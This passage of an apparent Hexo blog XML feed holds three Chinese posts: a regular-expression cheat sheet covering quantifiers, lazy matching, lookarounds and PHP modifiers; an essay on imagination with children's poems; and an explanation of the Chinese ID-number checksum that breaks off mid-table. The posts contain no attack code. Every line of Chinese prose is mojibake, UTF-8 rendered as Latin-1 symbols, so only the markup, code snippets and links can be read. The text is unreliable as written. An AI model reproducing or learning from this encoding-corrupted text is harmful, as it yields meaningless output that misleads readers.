Gitlabï¼ŒåˆæœŸå¯ä»¥åœ¨ NAS ä¸Šè¿è¡Œï¼ŒåæœŸå¦‚æœéœ€è¦ VPSï¼Œå¯ä»¥å¤§å®¶é›†èµ„åˆ†æ‘Šæˆæœ¬ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gakcvcd65zj30bz0godhl.jpg" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RegExp æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/post/RegExp%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/post/RegExp%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gai7yun0ffj31d10u0n1m.jpg" alt=""></p><center>æœªæ¥çš„ç¼–ç¨‹èƒ½åŠ›ä¼šåƒä»Šå¤©çš„æ±½è½¦é©¾é©¶èƒ½åŠ›å’Œè®¡ç®—æœºä½¿ç”¨èƒ½åŠ›ä¸€æ ·æ™®åŠã€‚</center><a id="more"></a><h3 id="å¸¸ç”¨å…ƒå­—ç¬¦"><a href="#å¸¸ç”¨å…ƒå­—ç¬¦" class="headerlink" title="å¸¸ç”¨å…ƒå­—ç¬¦"></a>å¸¸ç”¨å…ƒå­—ç¬¦</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th><th>å¯¹åº”è‹±è¯­å•è¯åŠ©è®°</th></tr></thead><tbody><tr><td><code>.</code></td><td>åŒ¹é…<font color='red'>é™¤</font>æ¢è¡Œç¬¦æ„å¤–çš„ä»»æ„å­—ç¬¦</td><td></td></tr><tr><td><code>\w</code></td><td>åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€æ±‰å­—</td><td>word</td></tr><tr><td><code>\s</code></td><td>åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ï¼Œå¦‚<code>\n</code>ã€<code>\r</code>ã€<code>\t</code>ç­‰</td><td>space</td></tr><tr><td><code>\d</code></td><td>åŒ¹é…æ•°å­—</td><td>digital</td></tr><tr><td><code>\b</code></td><td>åŒ¹é…å•è¯çš„å¼€å§‹æˆ–è€…ç»“æŸ</td><td></td></tr><tr><td><code>^</code></td><td>åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹</td><td></td></tr><tr><td><code>$</code></td><td>åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸ</td><td></td></tr></tbody></table><h3 id="å¸¸ç”¨é™å®šç¬¦"><a href="#å¸¸ç”¨é™å®šç¬¦" class="headerlink" title="å¸¸ç”¨é™å®šç¬¦"></a>å¸¸ç”¨é™å®šç¬¦</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>*</code></td><td>&gt;=0 æ¬¡</td></tr><tr><td><code>+</code></td><td>&gt;=1 æ¬¡</td></tr><tr><td><code>?</code></td><td>0 or 1 æ¬¡</td></tr><tr><td><code>{n}</code></td><td>n æ¬¡</td></tr><tr><td><code>{n,}</code></td><td>&gt;=n æ¬¡</td></tr><tr><td><code>{n, m}</code></td><td>n åˆ° m æ¬¡</td></tr></tbody></table><h3 id="æ‡’æƒ°é™å®šç¬¦"><a href="#æ‡’æƒ°é™å®šç¬¦" class="headerlink" title="æ‡’æƒ°é™å®šç¬¦"></a>æ‡’æƒ°é™å®šç¬¦</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>*?</code></td><td>é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td><code>+?</code></td><td>é‡å¤ &gt;=1 æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td><code>??</code></td><td>é‡å¤ 0 æˆ– 1 æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td><code>{n,m}?</code></td><td>é‡å¤ n åˆ° m æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr><tr><td><code>{n,}?</code></td><td>é‡å¤ n æ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤</td></tr></tbody></table><p>ä»¥å­—ç¬¦ä¸²<code>aabab</code>ä¸ºä¾‹ï¼Œåœ¨è´ªå©ªæ¨¡å¼ä¸‹ï¼Œ<code>a.*b</code>çš„åŒ¹é…ç»“æœæ˜¯<code>aabab</code>ï¼Œè€Œæ‡’æƒ°æ¨¡å¼ä¸‹<code>a.*?b</code>çš„ç»“æœåˆ™æ˜¯<code>aab</code>å’Œ<code>ab</code></p><h3 id="å¸¸ç”¨åä¹‰è¯"><a href="#å¸¸ç”¨åä¹‰è¯" class="headerlink" title="å¸¸ç”¨åä¹‰è¯"></a>å¸¸ç”¨åä¹‰è¯</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>\W</code></td><td>åŒ¹é…ä»»æ„éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€æ±‰å­—çš„å­—ç¬¦</td></tr><tr><td><code>\S</code></td><td>åŒ¹é…ä»»æ„éç©ºç™½å­—ç¬¦çš„å­—ç¬¦</td></tr><tr><td><code>\D</code></td><td>åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦</td></tr><tr><td><code>\B</code></td><td>åŒ¹é…éå•è¯å¼€å¤´æˆ–ç»“å°¾çš„ä½ç½®</td></tr><tr><td><code>[^aeiou]</code></td><td>åŒ¹é…é™¤äº† aeiou è¿™å‡ ä¸ªå­—æ¯ä»¥å¤–çš„ä»»æ„å­—ç¬¦</td></tr></tbody></table><h3 id="å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦"><a href="#å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦" class="headerlink" title="å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦"></a>å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>i</code></td><td>å¿½ç•¥å¤§å°å†™çš„åŒ¹é…</td></tr><tr><td><code>g</code></td><td>å…¨å±€åŒ¹é…</td></tr><tr><td><code>m</code></td><td>å°†å­—ç¬¦ä¸²è§†ä½œå¤šè¡Œï¼ŒåŒ…å«æ¢è¡Œç¬¦ä»èƒ½åŒ¹é…</td></tr><tr><td><code>s</code></td><td>å°†å­—ç¬¦ä¸²è§†ä¸ºå•è¡Œï¼Œæ¢è¡Œç¬¦ä¹Ÿä½œä¸ºæ™®é€šå­—ç¬¦å¤„ç†</td></tr><tr><td><code>x</code></td><td>å¿½ç•¥æ¨¡å¼ä¸­çš„ç©ºç™½</td></tr><tr><td><code>A</code></td><td>å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…</td></tr><tr><td><code>D</code></td><td>å¦‚æœä½¿ç”¨<code>$</code>é™åˆ¶ç»“å°¾å­—ç¬¦ï¼Œåˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ</td></tr><tr><td><code>U</code></td><td>å€¼åŒ¹é…æœ€è¿‘çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸é‡å¤åŒ¹é…</td></tr><tr><td><code>e</code></td><td>åŒ¹é…å‡½æ•°<code>preg_replace()</code>ä½¿ç”¨ï¼Œå¯ä»¥æŠŠåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å½“åšæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ</td></tr></tbody></table><h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><table><thead><tr><th>ç¬¦å·</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>|</code></td><td>åˆ†æ”¯æ¡ä»¶</td></tr><tr><td><code>[]</code></td><td>ç½—åˆ—æ‰€æœ‰éœ€è¦åŒ¹é…çš„å­—ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å­—æ¯ã€æ•°å­—é—´çš„ä¸­åˆ’çº¿è¡¨ç¤ºèŒƒå›´ï¼Œå¦‚<code>[0-9]</code>ã€<code>[a-z]</code>ã€<code>[0-9A-Z]</code>ï¼Œè€Œä¸”éœ€è¦é¡ºåºçš„è¡¨ç¤ºï¼Œå¦‚<code>[z-a]</code>æ— æ³•åŒ¹é…å­—ç¬¦ä¸²<code>abced</code> ä¸­çš„ä»»ä½•å­—ç¬¦ï¼›å¦‚æœä¸­åˆ’çº¿å³ä¾§æ— å¯¹åº”çš„å­—æ¯æˆ–æ•°å­—ï¼Œåˆ™ä»…ä»…è¡¨ç¤ºåŒ¹é…ä¸­åˆ’çº¿ï¼›åœ¨<code>[]</code>ä¸­çš„<code>^</code>è¡¨ç¤ºä¸åŒ…å«å…¶ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œè€Œéå­—ç¬¦ä¸²çš„èµ·å§‹</td></tr><tr><td><code>()</code></td><td>å¯¹æ¡ä»¶è¿›è¡Œåˆ†ç»„</td></tr></tbody></table><h3 id="é›¶å®½æ–­è¨€"><a href="#é›¶å®½æ–­è¨€" class="headerlink" title="é›¶å®½æ–­è¨€"></a>é›¶å®½æ–­è¨€</h3><p><code>(?=exp)</code> ä¹Ÿå«é›¶å®½åº¦æ­£é¢„æµ‹å…ˆè¡Œæ–­è¨€ï¼Œå®ƒ<strong>æ–­è¨€è‡ªèº«å‡ºç°çš„ä½ç½®çš„<em>åé¢</em>èƒ½åŒ¹é…è¡¨è¾¾å¼ exp</strong>ã€‚æ¯”å¦‚ \b\w+(?=ing\b)ï¼ŒåŒ¹é… ä»¥ ing ç»“å°¾çš„å•è¯çš„å‰é¢éƒ¨åˆ† (é™¤äº† ing ä»¥å¤–çš„éƒ¨åˆ†)ï¼Œå¦‚æŸ¥æ‰¾ Iâ€™m singing while youâ€™re dancing. æ—¶ï¼Œå®ƒä¼šåŒ¹é… sing å’Œ dancã€‚</p><p><code>(?&lt;=exp)</code> ä¹Ÿå« é›¶å®½åº¦æ­£å›é¡¾åå‘æ–­è¨€ï¼Œå®ƒ<strong>æ–­è¨€è‡ªèº«å‡ºç°çš„ä½ç½®çš„<em>å‰é¢</em>èƒ½åŒ¹é…è¡¨è¾¾å¼ exp</strong>ã€‚æ¯”å¦‚ (?&lt;=\bre)\w+\b ä¼šåŒ¹é… ä»¥ re å¼€å¤´çš„å•è¯çš„ååŠéƒ¨åˆ† (é™¤äº† re ä»¥å¤–çš„éƒ¨åˆ†)ï¼Œä¾‹å¦‚åœ¨æŸ¥æ‰¾ reading a book æ—¶ï¼Œå®ƒåŒ¹é… adingã€‚</p><h3 id="è´Ÿå‘é›¶å®½æ–­è¨€"><a href="#è´Ÿå‘é›¶å®½æ–­è¨€" class="headerlink" title="è´Ÿå‘é›¶å®½æ–­è¨€"></a>è´Ÿå‘é›¶å®½æ–­è¨€</h3><p>é›¶å®½åº¦è´Ÿé¢„æµ‹å…ˆè¡Œæ–­è¨€ <code>(?!exp)</code>ï¼Œ æ–­è¨€æ­¤ä½ç½®çš„åé¢ä¸èƒ½åŒ¹é…è¡¨è¾¾å¼ expã€‚ä¾‹å¦‚ï¼š<code>\d{3}(?!\d)</code> åŒ¹é… ä¸‰ä½æ•°å­—ï¼Œè€Œä¸”è¿™ä¸‰ä½æ•°å­—çš„åé¢ä¸èƒ½æ˜¯æ•°å­—ï¼› <code>\b((?!abc)\w)+\b</code> åŒ¹é… ä¸åŒ…å«è¿ç»­å­—ç¬¦ä¸² abc çš„å•è¯ã€‚</p><p>é›¶å®½åº¦è´Ÿå›é¡¾åå‘æ–­è¨€<code>(?&lt;!exp)</code>ï¼Œç”¨äºæ–­è¨€æ­¤ä½ç½®çš„å‰é¢ä¸èƒ½åŒ¹é…è¡¨è¾¾å¼ <code>expï¼š(?&lt;![a-z])\d{7}</code> åŒ¹é… å‰é¢ä¸æ˜¯å°å†™å­—æ¯çš„ä¸ƒä½æ•°å­—ã€‚</p><p>ä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­ï¼š<code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code> åŒ¹é… ä¸åŒ…å«å±æ€§çš„ç®€å• HTML æ ‡ç­¾å†…é‡Œçš„å†…å®¹ã€‚ <code>(?&lt;=&lt;(\w+)&gt;)</code> æŒ‡å®šäº†è¿™æ ·çš„ å‰ç¼€ï¼šè¢«å°–æ‹¬å·æ‹¬èµ·æ¥çš„å•è¯ (æ¯”å¦‚å¯èƒ½æ˜¯ <code>&lt;b&gt;</code>)ï¼Œç„¶åæ˜¯<code>.*</code>(ä»»æ„çš„å­—ç¬¦ä¸²), æœ€åæ˜¯ä¸€ä¸ª åç¼€ <code>(?=&lt;\/\1&gt;)</code>ã€‚æ³¨æ„åç¼€é‡Œçš„ <code>\/</code>ï¼Œå®ƒç”¨åˆ°äº†å‰é¢æè¿‡çš„å­—ç¬¦è½¬ä¹‰ï¼›\1 åˆ™æ˜¯ä¸€ä¸ªåå‘å¼•ç”¨ï¼Œå¼•ç”¨çš„æ­£æ˜¯ æ•è·çš„ç¬¬ä¸€ç»„ï¼Œå‰é¢çš„ <code>(\w+)</code> åŒ¹é…çš„å†…å®¹ï¼Œè¿™æ ·å¦‚æœå‰ç¼€å®é™…ä¸Šæ˜¯ <code>&lt;b&gt;</code> çš„è¯ï¼Œåç¼€å°±æ˜¯ <code>&lt;/b&gt;</code> äº†ã€‚æ•´ä¸ªè¡¨è¾¾å¼åŒ¹é…çš„æ˜¯ <code>&lt;b&gt;</code> å’Œ <code>&lt;/b&gt;</code> ä¹‹é—´çš„å†…å®¹ (å†æ¬¡æé†’ï¼Œä¸åŒ…æ‹¬å‰ç¼€å’Œåç¼€æœ¬èº«)ã€‚</p><h3 id="å¦‚ä½•é˜…è¯»æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¦‚ä½•é˜…è¯»æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¦‚ä½•é˜…è¯»æ­£åˆ™è¡¨è¾¾å¼"></a>å¦‚ä½•é˜…è¯»æ­£åˆ™è¡¨è¾¾å¼</h3><p>ä¸€ä¸ªå¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯ç”±ç®€å•çš„å½¢å¼ä¸€ç‚¹ç‚¹ç»„åˆè€Œæˆï¼Œå› æ­¤è§£è¯»æ—¶ä¹Ÿéœ€è¦è‚¢è§£åé€æ­¥ç†è§£ã€‚é¦–å…ˆæŸ¥æ‰¾<code>|</code>åˆ¤æ–­æ‹†åˆ†ä¸ºå¤šç§æƒ…å†µï¼Œç„¶åæŸ¥æ‰¾<code>()</code>å†æ¬¡ç»†åˆ†ï¼Œæœ€åå†æ ¹æ®æœ€è¿‘åŸåˆ™åˆ¤æ–­é™å®šä¿®é¥°ç¬¦çš„ä¿®é¥°èŒƒå›´ï¼Œä¾æ¬¡æ‹†è§£åå°±ä¼šæ‹¨äº‘è§æ—¥äº†ã€‚åŒæ—¶ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©<a href="https://regexper.com/" target="_blank" rel="noopener">å¯è§†åŒ–å·¥å…·</a>æ¥ç†è§£ï¼Œå¦‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gai6f64qwyj31er0u0q8c.jpg" alt=""></p><h3 id="å°æ„Ÿ"><a href="#å°æ„Ÿ" class="headerlink" title="å°æ„Ÿ"></a>å°æ„Ÿ</h3><p>æ­£åˆ™è™½ç„¶çµæ´»å¼ºå¤§ï¼Œä½†å¯¹äººç±»ä¸å¤Ÿå‹å¥½ï¼Œä¹¦å†™ä¸é˜…è¯»éƒ½æ¯”è¾ƒéº»çƒ¦ï¼Œç°åœ¨å¾ˆå¤šè¯­è¨€çš„åº“æˆ–è€…å‡½æ•°éƒ½è¦†ç›–äº†å¸¸è§ç±»å‹çš„éªŒè¯ï¼Œå¦‚ PHP ä¸­çš„<a href="https://www.php.net/manual/zh/filter.filters.php" target="_blank" rel="noopener"><code>filter_var()</code></a>æ”¯æŒåŸŸåã€é‚®ç®±ã€IPã€MAC åœ°å€ã€URL ç­‰éªŒè¯ï¼Œæˆ‘ä»¬åº”å½“ä¼˜å…ˆè€ƒè™‘è¿™ç§ä¼˜é›…å¯è¯»æ€§å¥½çš„éªŒè¯æ–¹å¼ï¼Œä»…åœ¨ä¸å¾—å·²æˆ–æ­£åˆ™æ›´åŠ ç®€æ´æ¸…æ™°çš„åœºæ™¯ä¸‹ä½¿ç”¨æ­£åˆ™ï¼Œåˆ‡å‹¿æ»¥ç”¨ï¼</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ol><li><a href="https://deerchao.cn/tutorials/regex/regex.htm" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ 30 åˆ†é’Ÿå…¥é—¨æ•™ç¨‹</a></li><li><a href="https://tool.oschina.net/regex" target="_blank" rel="noopener">åœ¨çº¿æ­£åˆ™è¡¨è¾¾å¼æµ‹è¯•</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æƒ³è±¡åŠ›</title>
      <link href="/post/imagination/"/>
      <url>/post/imagination/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gaf2od5nyij30to0euju7.jpg" alt=""></p><center>é€»è¾‘å¯ä»¥å°†æˆ‘ä» A å¸¦åˆ° Bï¼Œä½†æƒ³è±¡å¯ä»¥å¸¦æˆ‘åˆ°ä»»ä½•åœ°æ–¹ã€‚â€”â€”çˆ±å› æ–¯å¦</center><a id="more"></a><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬è§‰å¾—å°åŠ¨ç‰©æˆ–è€…ä¸‰å²å·¦å³çš„å°å­©å¾ˆå¯çˆ±ï¼Ÿæˆ‘è®¤ä¸ºæ˜¯å› ä¸ºä»–ä»¬åœ¨è¿™ä¸ªå¹´é¾„æ®µæœ‰è€…å¤©é©¬è¡Œç©ºçš„æƒ³è±¡åŠ›ï¼Œè¿˜æ²¡æœ‰è¢«æ•™è‚²æ‰€æŸç¼šã€‚å½“æˆ‘ä»¬å’Œä¸€ä¸ªä¸‰å²çš„å°æœ‹å‹å¯¹è¯æ—¶ï¼Œä»–æ€»ä¼šç»™ä½ ä¸€äº›å‡ºä¹æ„æ–™çš„ç­”æ¡ˆï¼Œè¿™ç§å‡ºä¹æ„æ–™å¤§å¤šä¼šè®©ä½ æ„Ÿåˆ°æƒŠå–œã€‚æ¯”å¦‚ï¼Œæˆ‘æ›¾ç»é—® 5 å²çš„è¡¨å¼Ÿï¼Œå“ªè¾†è½¦æ˜¯æˆ‘ä»¬å®¶çš„ï¼Ÿä»–å›ç­”åˆ°â€œè¾£æ¤’çš„é¢œè‰²é‚£è¾†â€ã€‚</p><p>å½“æˆ‘å’Œå°æœ‹å‹èŠå¤©æ—¶ï¼Œæˆ‘çªç„¶æ„è¯†åˆ°è‡ªå·±å·²ç»å¤±å»äº†ä»–ä»¬è¿™æ ·çš„æƒ³è±¡åŠ›ï¼Œé‚£æˆ‘åˆæ˜¯ä½•æ—¶å¤±å»çš„å‘¢ï¼Ÿæ˜¯<a href="https://www.bilibili.com/video/av71561435" target="_blank" rel="noopener">å­¦ä¹ æ–°çš„çŸ¥è¯†</a>å¿˜è®°äº†æƒ³è±¡å—ï¼ŸçŸ¥è¯†å’Œæƒ³è±¡åŠ›æ˜¯ä¸€ä¸ªé›¶å’Œæ¸¸æˆå—ï¼Ÿ</p><p>æˆ‘æƒ³ï¼Œé€»è¾‘ä¸°å¯Œäº†äººç±»çš„ç‰©è´¨ä¸–ç•Œï¼Œè€Œæƒ³è±¡åˆ™ä¸°å¯Œäº†äººç±»çš„ç²¾ç¥ä¸–ç•Œï¼ŒäºŒè€…å¹¶ä¸çŸ›ç›¾ï¼Œåªæ˜¯æˆ‘ä»¬èµ¶è·¯å¤ªè¿‡åŒ†å¿™ï¼Œä¹Ÿè¦é€‚æ—¶åœä¸‹è„šæ­¥ï¼ŒæŠ¬å¤´çœ‹çœ‹æ·±é‚ƒçš„æ˜Ÿç©ºã€‚</p><p>ã€Šé£ã€‹<br>é£å»å“ªé‡Œäº†ï¼Ÿ<br>é£æ‰¾å°æ ‘è·³èˆå»äº†ï¼</p><p>ã€Šæ”¶ç©å…·ã€‹<br>å¦ˆå¦ˆè¯´ä¸€å®šè¦æ”¶ç©å…·<br>å¯æ˜¯æˆ‘ä¸èƒ½<br>æˆ‘çš„å°å…”å­<br>æ­£åœ¨å¼¹é’¢ç´</p><p>ã€Šåƒæœˆäº®ã€‹<br>æˆ‘å’Œå¦ˆå¦ˆåœ¨å›å®¶çš„è·¯ä¸Šï¼Œ<br>çœ‹è§äº†ä¸€ä¸ªåœ†åœ†çš„æœˆäº®ã€‚<br>æˆ‘é—®å¦ˆå¦ˆï¼Œ<br>æœˆäº®ä¸ºä»€ä¹ˆè¿™ä¹ˆåœ†å‘¢ï¼Ÿ<br>å¦ˆå¦ˆè¯´ï¼Œ<br>å› ä¸ºåäº”å¿«åˆ°å•¦ï¼</p><p>åœ†åœ†çš„æœˆäº®ï¼ŒçœŸå¥½ç©ï¼<br>å¦‚æœæˆ‘æŠŠæœˆäº®å’¬ä¸€å°å£ï¼Œ<br>æœˆäº®ä¼šæ€ä¹ˆæ ·ï¼Ÿ<br>å—¯ï¼Œå’¬å°å°ä¸€å£ï¼Œ<br>å®ƒåº”è¯¥å°±å’Œä¸€ä¸ªè‹¹æœ<br>è¢«å°è€é¼ å•ƒäº†ä¸€å£åä¸€æ ·å§ï¼</p><p>é‚£å¦‚æœæˆ‘å’¬ä¸€å¤§å£ï¼Œ<br>ä¼šå˜æˆä»€ä¹ˆå‘¢ï¼Ÿ<br>æˆ‘æƒ³ä¼šå˜æˆå°æœˆäº®ç‰™ï¼Œ<br>å°±åƒä¸€åªå¼¯å¼¯çš„å°èˆ¹ï¼</p><p>å¦‚æœæˆ‘æŠŠé‚£ä¸ªå°æœˆäº®ç‰™ä¹Ÿåƒäº†ï¼Œ<br>ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ<br>æœˆäº®æ²¡äº†ï¼<br>ä½ çŒœï¼<br>å®ƒä¼šåœ¨æˆ‘çš„è‚šå­é‡Œï¼Ÿ<br>è¿˜æ˜¯æ¢¦é‡Œï¼Ÿ</p><p>ã€Šå¤§å¤§çš„å¤©ã€‹<br>å¤©ï¼Œå¥½å¤§å¥½å¤§<br>è¿åˆ°äº†ç«è½¦ç«™<br>åˆè¿åˆ°äº†ç«è½¦å»çš„æ¯ä¸€ä¸ªåœ°æ–¹ã€‚<br>å¤©ï¼Œå¥½å¤§å¥½å¤§<br>å¦‚æœåœ¨ä¸Šé¢æ•£æ­¥<br>è¦æ•£<br>å¥½ä¹…å¥½ä¹…å‘¢ï¼</p><blockquote><p>ä»¥ä¸Šå†…å®¹æ¥è‡ª<a href="https://www.zhihu.com/question/308829198/answer/670941422" target="_blank" rel="noopener">å°ç¬¼åŒ…é©¬è¿·</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½ çš„èº«ä»½è¯å·ç éƒ½åŒ…å«äº†å“ªäº›ä¿¡æ¯ï¼Ÿ</title>
      <link href="/post/id-number-infos/"/>
      <url>/post/id-number-infos/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gaa6v59h4pj319s0tknj1.jpg" alt=""></p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gaa6szfzr9j30qo0h0438.jpg" alt=""></p><p>æ¯ä½åˆæ³•ä¸­å›½å…¬æ°‘éƒ½ä¼šè·å¾—ç”±æ”¿åºœæœºå…³é¢å‘çš„å¦‚å›¾èº«ä»½è¯ï¼ˆå¤šå¹´å‰ P çš„å¤ªæ¸£äº†ï¼Œå‡‘åˆçœ‹å§ï¼‰ï¼Œè¿™ 18 ä½çš„æ•°å­—æ¯ä½éƒ½æœ‰è‡ªå·±çš„å«ä¹‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9hvxjhzj30dw07ft9b.jpg" alt=""></p><p>å…¶ä¸­ï¼Œç¬¬ 17 ä½æ˜¯æŒ‰ç…§æˆ·å£ç™»è®°é¡ºåºï¼Œç”·æ€§ 13579ï¼Œå¥³æ€§ 24680ï¼Œä»¥ä¿è¯åŒä¸€åœ°åŒºçš„åŒå¹´åŒæœˆåŒæ—¥å‡ºç”Ÿçš„äººæ‹¥æœ‰å”¯ä¸€èº«ä»½è¯å·ç ï¼ˆå“¦å¼ï¼Ÿçœ‹äº†ä¸€çœ¼æˆ‘èº«ä»½è¯çš„ç¬¬ 17 ä½ï¼Œå¥½åƒå‘ç°äº†ç‚¹ä»€ä¹ˆğŸ¤­)ã€‚å¦‚æœä»…é ç¬¬ 17 ä½æ¥ä¿è¯æ€§åˆ«çš„åŒæ—¶åˆä¿è¯å”¯ä¸€ï¼Œé‚£å•ä¸€æ€§åˆ«çš„æç«¯æƒ…å†µçš„å®¹é‡åªæœ‰ 5ï¼Œåƒæœ€è¿‘çš„<a href="https://weibo.com/2286908003/Ia5OnnnQe" target="_blank" rel="noopener">å›½åº†å››èƒèƒ</a>ï¼Œå‡è®¾å››èƒèƒåœ¨æç«¯æƒ…å†µä¸‹éƒ½æ˜¯ç›¸åŒæ€§åˆ«ï¼Œé‚£åŒåœ°åŒºåŒä¸€å¤©å‡ºç”Ÿçš„å…¶ä»–äººåªæœ‰ä¸€ä¸ªåé¢äº†ï¼Œæ‰€ä»¥å¯èƒ½åŒä¸€æ´¾å‡ºæ‰€ä¼šæœ‰å¤šä¸ªä»£ç ã€‚</p><p>ç¬¬ 18 ä½åˆ™æ˜¯å‰ 17 ä½çš„æ ¡éªŒå’Œï¼Œé€šè¿‡è¿™ä¸€ä½ï¼Œå°±èƒ½åˆæ­¥æ ¡éªŒå‡ºèº«ä»½è¯å·ç æ˜¯å¦åˆæ³•ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹èƒ½å‘ç°å¡«å†™é”™è¯¯ï¼Œæˆ‘ä»¬ä»¥<code>11010519491231002X</code>ä¸ºä¾‹ï¼Œè®²è§£å…¶å…·ä½“çš„æ ¡éªŒè§„åˆ™ï¼š</p><p>1ã€ å‰ 17 ä½æ¯ä½éƒ½å¯¹åº”ä¸€ä¸ªæƒé‡å€¼ï¼Œå°†æ¯ä½çš„èº«ä»½è¯å·ç ä¸æƒé‡å€¼ç›¸ä¹˜ï¼Œå†æ±‚å‰ 17 ä½çš„å’Œ <code>7*1 + 9*1 ... 4*0 + 2*0</code>ï¼Œç»“æœä¸º 167</p><table><thead><tr><th align="center">æƒé‡</th><th align="center">7</th><th align="center">9</th><th align="center">10</th><th align="center">5</th><th align="center">8</th><th align="center">4</th><th align="center">2</th><th align="center">1</th><th align="center">6</th><th align="center">3</th><th align="center">7</th><th align="center">9</th><th align="center">10</th><th align="center">5</th><th align="center">8</th><th align="center">4</th><th align="center">2</th></tr></thead><tbody><tr><td align="center">å·ç </td><td align="center">1</td><td align="center">1</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">9</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">0</td><td align="center">0</td></tr></tbody></table><p>2ã€ å°†ä¸Šä¸€æ­¥çš„è®¡ç®—ç»“æœ 167 å– 11 çš„æ¨¡ï¼Œå¾— 2</p><blockquote><p>ä¸ºä»€ä¹ˆè¦å– 11 çš„æ¨¡å‘¢ï¼Ÿè¿™æ˜¯å› ä¸º 11 æ˜¯ç´ æ•°ï¼Œè€Œç´ æ•°æ˜¯åªèƒ½è¢« 1 å’Œå…¶æœ¬èº«æ•´é™¤çš„æ•°ï¼Œå› æ­¤èƒ½åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¿è¯å–åˆ°ä½™æ•°ï¼Œä¹Ÿä¿è¯äº†åœ¨å¤§å¤šæ•°è¾“å…¥é”™è¯¯çš„æƒ…å†µä¸‹èƒ½æ£€æµ‹åˆ°ã€‚</p></blockquote><p>3ã€ ä½™æ•°å¯¹åº”æ ¡éªŒä½çš„å€¼å¦‚ä¸‹è¡¨ï¼Œå¯¹ç…§å¯å¾— Xï¼Œæ­£å¥½æ˜¯æœ«ä½å€¼ï¼Œå› æ­¤åˆ¤å®šä¸ºç¬¦åˆè§„åˆ™</p><table><thead><tr><th align="center">ä½™æ•°</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th></tr></thead><tbody><tr><td align="center">æ ¡éªŒå’Œ</td><td align="center">1</td><td align="center">0</td><td align="center">X</td><td align="center">9</td><td align="center">8</td><td align="center">7</td><td align="center">6</td><td align="center">5</td><td align="center">4</td><td 